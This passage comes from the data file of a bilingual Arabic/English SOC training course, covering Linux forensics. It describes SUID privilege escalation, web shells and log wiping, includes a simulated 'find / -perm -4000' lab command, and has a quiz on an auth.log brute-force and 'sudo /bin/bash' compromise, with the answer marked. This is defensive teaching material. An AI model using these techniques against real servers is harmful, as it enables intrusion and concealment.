  <li><code>journalctl -u ssh -S today:</code> فحص سجلات خدمة SSH لليوم الحالي بتنسيق منظم.</li>
  <li><code>lsof -i :80:</code> معرفة أي عملية تحتكر وتستمع على منفذ الويب 80 حالياً.</li>
</ul>
      `,
      theoryEn: `<h3>Linux Architecture, Filesystem Hierarchy, Permissions & SOC Telemetry Analysis</h3>`,
      attackDefenseAr: `
<h3>منظور المهاجم والمدافع: السيطرة على لينكس وتصعيد الصلاحيات (Privilege Escalation)</h3>
<div class="battle-grid">
  <div class="attacker-side">
    <h4>🔴 كيف يستهدف الهكر خوادم لينكس؟</h4>
    <ul>
      <li><strong>تصعيد الصلاحيات عبر SUID:</strong> البحث عن برامج تملك صلاحية SUID (تنفذ بصلاحية مالكها Root حتى لو شغلها مستخدم عادي) لاستغلالها والخروج بـ Root Shell.</li>
      <li><strong>زرع الـ Web Shells في مجلدات الويب:</strong> رفع ملف PHP خبيث في <code>/var/www/html/uploads/</code> لتنفيذ أوامر سطر الأوامر عبر المتصفح.</li>
      <li><strong>مسح الآثار (Defense Evasion):</strong> محاولة تفريغ ملفات السجلات أو مسح ملف <code>~/.bash_history</code> لإخفاء الأدلة.</li>
    </ul>
  </div>
  <div class="defender-side">
    <h4>🟢 كيف يدافع محلل الـ SOC ويستخرج الأدلة؟</h4>
    <ul>
      <li><strong>مراقبة سجلات المصادقة (Auditd & Auth.log):</strong> إرسال سجلات <code>/var/log/auth.log</code> فوراً لنظام الـ SIEM الخارجي حتى لا يتمكن المهاجم من التلاعب بها محلياً.</li>
      <li><strong>رصد أوامر Sudo غير المصرح بها:</strong> تنبيه فوري عند قيام أي مستخدم عادي بتشغيل <code>sudo</code> فاشل أو محاولة تشغيل <code>sudo /bin/bash</code>.</li>
    </ul>
  </div>
</div>
      `,
      attackDefenseEn: `<h3>Attacker vs Defender: Linux Privilege Escalation vs Auditd & Auth Telemetry</h3>`,
      labAr: `
<div class="lab-workspace">
  <div class="lab-instructions">
    <h4>🧪 المعمل التطبيقي 2.6: فحص سجلات Linux واستخراج الهجمات عبر grep و awk</h4>
    <p>تدرب على استخدام أوامر سطر أوامر لينكس لتحليل سجلات المصادقة auth.log واكتشاف محاولات كسر SSH.</p>
  </div>
  <div class="terminal-box">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> basharsec@soc-workstation:~$</div>
    <div class="terminal-body" id="lab-term-2-6">
      <div class="term-line output">Linux Forensic Analysis Terminal</div>
      <div class="term-line output">Type 'cat /var/log/auth.log' or 'grep Failed /var/log/auth.log' to investigate.</div>
    </div>
  </div>
  <div class="quick-commands">
    <button class="btn-cmd" onclick="runSimCommand('grep &quot;Failed password&quot; /var/log/auth.log', 'lab-term-2-6')">Grep Failed Passwords</button>
    <button class="btn-cmd" onclick="runSimCommand('find / -perm -4000 2>/dev/null', 'lab-term-2-6')">Find SUID Binaries</button>
    <button class="btn-cmd" onclick="runSimCommand('crontab -l', 'lab-term-2-6')">Inspect User Crontab</button>
  </div>
</div>
      `,
      labEn: `<p>Interactive Linux command-line log analysis and SUID hunting.</p>`,
      ticket: {
        ticketId: "SEC-TICK-206",
        severity: "HIGH",
        severityClass: "high",
        sourceHost: "SRV-UBUNTU-PROD-01",
        timestamp: "2026-11-06 21:14:02 UTC",
        ruleTriggered: "LINUX_SSH_BRUTE_FORCE_SUCCESS_AFTER_FAILURES",
        rawLog: `TIMESTAMP: 2026-11-06 21:13:40 ubuntu-prod sshd[14201]: Failed password for invalid user admin from 194.26.29.112 port 49102 ssh2
TIMESTAMP: 2026-11-06 21:13:44 ubuntu-prod sshd[14204]: Failed password for invalid user root from 194.26.29.112 port 49104 ssh2
TIMESTAMP: 2026-11-06 21:13:51 ubuntu-prod sshd[14210]: Failed password for deployer from 194.26.29.112 port 49110 ssh2
TIMESTAMP: 2026-11-06 21:14:02 ubuntu-prod sshd[14218]: Accepted password for deployer from 194.26.29.112 port 49122 ssh2
TIMESTAMP: 2026-11-06 21:14:03 ubuntu-prod sudo[14225]: deployer : TTY=pts/1 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/bash`,
        questionAr: "تفحص تتابع الأحداث الخمسة في سجل لينكس أعلاه. ما هو التشخيص الدقيق لهذا الحادث وما الخطوة العاجلة؟",
        questionEn: "Analyze the sequence of 5 log entries in auth.log. What is the diagnosis and immediate action?",
        optionsAr: [
          "المطور نسي كلمة المرور وحاول 3 مرات ثم دخل بنجاح.",
          "هجوم كسر كلمات مرور SSH Brute Force ناجح: المهاجم من IP خارجي 194.26.29.112 جرب عدة حسابات وفشل، ثم نجح في تخمين كلمة مرور حساب deployer، وفور دخوله نفذ sudo /bin/bash وحصل على كامل صلاحيات Root! الإجراء: إنهاء الجلسة فوراً، حظر الـ IP، وتغيير مفاتيح السيرفر.",
          "تحديث تلقائي لخدمة SSH.",
          "تسجيل دخول مشروع من شبكة الشركة الداخلية."
        ],
        optionsEn: [
          "Developer forgot password and succeeded on 4th attempt.",
          "Successful SSH Brute Force & Privilege Escalation: External IP guessed deployer password and immediately spawned Root shell via sudo /bin/bash. Kill session and block IP.",
          "Automated SSH daemon update.",
          "Legitimate internal login."
        ],
        correctIndex: 1,
        explanationAr: "تشخيص جنائي عبقري واحترافي يا باشمهندس بشار! هذا السيناريو من أخطر ما يواجهه محلل الـ SOC: محاولات فاشلة متتالية متبوعة بـ 'Accepted password for deployer' من نفس العنوان الخارجي، ومباشرة بعدها بثانية واحدة نفذ المهاجم: 'COMMAND=/bin/bash' تحت صلاحية USER=root، مما يعني أن المهاجم الآن يتحكم بالسيرفر بصلاحية Root الكاملة! الإجراء الحاسم: قتل الجلسة فوراً، عزل السيرفر عن الشبكة، حظر الـ IP 194.26.29.112، وفحص الملفات المنشأة حديثاً في /tmp.",
        explanationEn: "Spot on! Multiple failed attempts followed by an accepted login and an immediate sudo /bin/bash root escalation proves successful external compromise."
      }
    }
  ]
};
